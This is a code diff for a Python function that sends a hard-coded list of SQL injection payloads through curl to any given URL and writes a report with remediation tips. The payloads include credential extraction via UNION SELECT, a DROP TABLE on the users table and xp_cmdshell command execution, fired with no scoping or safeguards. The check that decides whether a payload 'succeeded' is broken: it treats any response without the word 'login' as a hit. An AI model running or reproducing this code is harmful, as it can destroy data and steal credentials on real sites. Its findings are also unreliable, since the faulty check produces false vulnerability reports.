@@ -1,46 +1,78 @@
 import subprocess
+import urllib.parse
+import os
 
-def run_sqlmap(url):
+
+def run_sqlmap(url: str):
     """
-    Runs SQLmap on the given URL to test for SQL Injection vulnerabilities.
-
+    Test for SQL Injection vulnerabilities and provide explanations.
     Args:
-        url (str): The URL to test for SQL Injection.
-
+        url (str): The URL to test.
     Returns:
-        str: Path to the results file or an error message.
+        tuple: Test results as a string and the path to the results file.
     """
     try:
-        # Define the path to sqlmap.py
-        sqlmap_path = './sqlmap/sqlmap.py'
+        url = url.strip()
+        if not url.startswith(('http://', 'https://')):
+            return "Invalid URL: Must start with http:// or https://", None
 
-        # Create the SQLmap command
-        command = [
-            'python3', sqlmap_path,
-            '-u', url,               # The URL to test for SQL Injection
-            '--batch',               # Automatically proceed with default options
-            '--level=5',             # Maximum level of testing
-            '--risk=3',              # Maximum risk for more aggressive tests
-            '--threads=10'           # Use 10 threads for faster testing
+        payloads = [
+            ("' OR '1'='1 --", "Bypass login with always-true condition."),
+            ("' UNION SELECT null, username, password FROM users --", "Extract user credentials via UNION SELECT."),
+            ("'; DROP TABLE users; --", "Attempt to delete the users table."),
+            ("' OR 'a'='a", "Bypass login with simple true condition."),
+            ("'; EXEC xp_cmdshell('dir') --", "Execute system command on the server."),
+            ("' AND 1=0 UNION ALL SELECT NULL, version(), current_user --", "Retrieve DB version and current user."),
         ]
 
-        # Run the SQLmap command
-        result = subprocess.run(command, capture_output=True, text=True)
+        results = ""
+        
+        for payload, purpose in payloads:
+            encoded_payload = urllib.parse.quote(payload)
+            full_url = f"{url}?id={encoded_payload}"
+            command = ['curl', '-X', 'GET', full_url]
+            
+            result = subprocess.run(command, capture_output=True, text=True)
 
-        # Define the output file path
-        output_file = "./sqlmap_result.txt"
+            success = "✅" if result.returncode == 0 and "login" not in result.stdout.lower() else "❌"
 
-        # Save the results to a file
-        with open(output_file, "w") as file:
-            if result.returncode == 0:
-                file.write(result.stdout)
+            results += f"{success} Payload: {payload}\n"
+            results += f"Purpose: {purpose}\n"
+
+            if success == "✅":
+                results += "Result: Potential vulnerability detected!\n"
             else:
-                file.write(f"Error: {result.stderr}")
+                results += "Result: No vulnerability detected for this payload.\n"
 
-        # Return the file path for downloading
-        return output_file
+            results += "\nResponse Preview:\n" + result.stdout[:200] + "...\n\n"
+            
+            # Explain the issue and potential fixes
+            if success == "✅":
+                results += "Explanation: The server responded positively to the payload, suggesting a possible vulnerability.\n"
+                if "1'='1" in payload:
+                    results += "Issue: SQL injection allows login bypass.\n"
+                    results += "Fix: Use prepared statements or ORM libraries to prevent SQL injection. Validate and sanitize user inputs.\n"
+                elif "DROP TABLE" in payload:
+                    results += "Issue: SQL injection can delete critical tables.\n"
+                    results += "Fix: Apply strict database permissions and input filtering.\n"
+                elif "xp_cmdshell" in payload:
+                    results += "Issue: Remote code execution.\n"
+                    results += "Fix: Disable dangerous SQL functions and limit server privileges.\n"
+                else:
+                    results += "Issue: Data leakage or server exploitation.\n"
+                    results += "Fix: Use Web Application Firewalls (WAFs) and keep software up to date.\n"
+                results += "\n"
+        
+        # Save results to a file
+        output_file = "./sql_injection_result.html"
+        with open(output_file, "w") as file:
+            file.write(f"<html><body><pre>{results}</pre></body></html>")
+
+        return results, output_file
+
     except Exception as e:
-        error_file = "./sqlmap_error.txt"
+        error_message = f"Error running SQL Injection test: {str(e)}"
+        error_file = "./sql_injection_error.txt"
         with open(error_file, "w") as file:
-            file.write(f"Error running SQLmap: {str(e)}")
-        return error_file
+            file.write(error_message)
+        return error_message, error_file
